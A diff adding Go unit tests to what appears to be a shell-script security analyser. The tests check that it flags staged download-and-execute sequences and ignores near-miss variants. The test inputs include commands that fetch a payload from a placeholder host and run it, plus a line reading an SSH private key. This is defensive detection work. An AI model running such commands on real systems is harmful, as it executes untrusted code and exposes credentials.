@@ -677,6 +677,48 @@ func TestDownloaderOutputIsFilesystemWrite(t *testing.T) {
 	}
 }
 
+func TestStagedDownloadExecutionIsTraceableInference(t *testing.T) {
+	for _, program := range []string{
+		"curl -o ./payload https://example.test/payload\nbash ./payload\n",
+		"wget -O ./payload https://example.test/payload\nsource ./payload\n",
+		"curl --output=./payload https://example.test/payload\nchmod +x ./payload\n./payload\n",
+	} {
+		t.Run(program, func(t *testing.T) {
+			result := Sources(runtimeShell(program))
+			finding := findingByCategory(t, result, "download-and-execute")
+			if finding.Claim != report.ClaimInference || finding.Severity != report.SeverityHigh ||
+				finding.Confidence != report.ConfidenceMedium || finding.Scope != report.ScopeRuntime ||
+				len(finding.Evidence) < 2 || len(finding.Related) < 2 || finding.Provenance.RuleID != correlationRuleID {
+				t.Fatalf("staged execution lost uncertainty or evidence: %#v", finding)
+			}
+		})
+	}
+}
+
+func TestStagedDownloadCorrelationRequiresLaterExactLiteralPath(t *testing.T) {
+	for _, program := range []string{
+		"bash ./payload\ncurl -o ./payload https://example.test/payload\n",
+		"curl -o ./payload https://example.test/payload\nbash ./other\n",
+		"curl -o \"$output\" https://example.test/payload\nbash \"$output\"\n",
+		"curl -O https://example.test/payload\nbash payload\n",
+		"curl -o ./payload https://example.test/payload\nbash -c ./payload\n",
+		"curl -o ./payload https://example.test/payload\nbash --rcfile ./payload ./other\n",
+		"curl -o ./payload https://example.test/payload\npython3 -W ./payload ./other.py\n",
+		"curl -o ./payload https://example.test/payload\nnode --require ./payload ./other.js\n",
+		"curl -o ./payload https://example.test/payload\nexec -a ./payload ./other\n",
+		"git config remote.origin.url https://example.test/payload\nbash ./payload\n",
+	} {
+		t.Run(program, func(t *testing.T) {
+			result := Sources(runtimeShell(program))
+			for _, finding := range result.Findings {
+				if finding.Category == "download-and-execute" && finding.Provenance.RuleID == correlationRuleID {
+					t.Fatalf("unmatched download became staged execution: %#v", finding)
+				}
+			}
+		})
+	}
+}
+
 func TestLiteralPrivilegeWrapperPreservesNestedCredentialFact(t *testing.T) {
 	result := Sources(runtimeShell("sudo cat ~/.ssh/id_ed25519\n"))
 	finding := findingByCategory(t, result, "credential-access")
